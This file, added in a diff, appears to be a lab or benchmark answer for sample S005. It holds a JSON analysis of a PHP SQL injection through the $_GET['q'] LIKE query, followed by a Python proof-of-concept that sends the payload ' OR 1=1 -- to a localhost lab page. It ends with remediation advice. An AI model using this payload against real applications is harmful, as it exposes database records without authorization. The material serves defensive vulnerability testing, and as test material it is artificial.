@@ -1,0 +1,73 @@
+```json
+{
+  "sample_id": "S005",
+  "prediction": "vulnerable",
+  "vulnerability_type": "SQL注入",
+  "locations": ["F01:0007", "F01:0010", "F01:0011"],
+  "evidence": {
+    "source": "F01:0007 从 $_GET['q'] 读取外部输入并赋给 $q，入口可达。",
+    "flow": "F01:0010 将 $q 直接拼接到 LIKE 模式 SQL 字符串中；F01:0011 将拼接后的 SQL 交给 $db->query 执行。",
+    "guard": "无效：输入路径未见 prepare/bind、mysqli_real_escape_string 或白名单；LIKE 的 %/_ 通配符语义本身不构成注入防护。",
+    "sink": "F01:0011 $db->query($sql) 是实际 SQL 执行点。"
+  },
+  "prerequisites": [
+    "本地入口 http://127.0.0.1:4280/lab_cases/S005/index.php 可达",
+    "common/db_connect.php 已正确提供已连接的 mysqli 变量 $db",
+    "lab_people 表存在且预置 1 Alice、2 Bob、3 Carol",
+    "无需登录"
+  ],
+  "missing_context": [
+    "common/db_connect.php 的实际实现未包含在输入包中，未核对其连接细节；按 runtime_context 假定其提供已连接的 $db。"
+  ],
+  "poc_generated": true,
+  "poc_language": "python3",
+  "poc_instructions": "运行 python3 poc.py。脚本仅请求 127.0.0.1:4280，先以普通输入 q=Alice 查询，预期仅返回 Alice；再以测试输入 q=' OR 1=1 -- （脚本自动 URL 编码）查询，预期返回 Alice、Bob、Carol。比较解析到的 ID/name 记录，不要以 HTTP 200 作为成功条件。失败时检查入口可达、common/db_connect.php 的 $db、lab_people 表及预置数据。"
+}
+```
+
+```python
+import re
+import urllib.parse
+import urllib.request
+
+BASE = "http://127.0.0.1:4280/lab_cases/S005/index.php"
+ROW_RE = re.compile(r'<p>ID\s+(\d+)：([^<]*)</p>')
+
+
+def fetch(q):
+    url = BASE + "?" + urllib.parse.urlencode({"q": q})
+    with urllib.request.urlopen(url, timeout=5) as resp:
+        body = resp.read().decode("utf-8", "replace")
+    rows = [(int(i), name) for i, name in ROW_RE.findall(body)]
+    return url, rows
+
+
+def main():
+    normal_q = "Alice"
+    test_q = "' OR 1=1 -- "
+
+    normal_url, normal_rows = fetch(normal_q)
+    test_url, test_rows = fetch(test_q)
+
+    print("normal url:", normal_url)
+    print("normal rows:", normal_rows)
+    print("test url:", test_url)
+    print("test rows:", test_rows)
+
+    normal_ok = normal_rows == [(1, "Alice")]
+    test_names = {name for _, name in test_rows}
+    test_ok = {"Alice", "Bob", "Carol"}.issubset(test_names)
+
+    print("normal_expected_only_Alice:", normal_ok)
+    print("test_expected_three_preset_people:", test_ok)
+
+    if not (normal_ok and test_ok):
+        print("检查：入口可达、common/db_connect.php 的 $db、lab_people 表与 1 Alice/2 Bob/3 Carol 数据。")
+        raise SystemExit(1)
+
+
+if __name__ == "__main__":
+    main()
+
+# 防护建议：使用预处理并绑定参数，例如 LIKE CONCAT('%', ?, '%')，不要把 q 直接拼入 SQL。
+```
